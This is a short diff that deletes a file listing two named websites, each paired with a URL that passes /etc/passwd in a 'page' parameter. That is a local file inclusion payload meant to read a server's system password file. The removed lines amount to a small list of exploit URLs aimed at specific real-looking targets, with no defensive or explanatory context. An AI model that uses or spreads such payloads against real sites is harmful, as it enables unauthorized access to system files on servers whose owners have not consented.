@@ -1,8 +1,0 @@
-First Site:
-
-http://www.lovium.nl/index.php?page=/etc/passwd
-
-
-Second Site:
-
-http://ksim.sourceforge.net/index.php?page=/etc/passwd
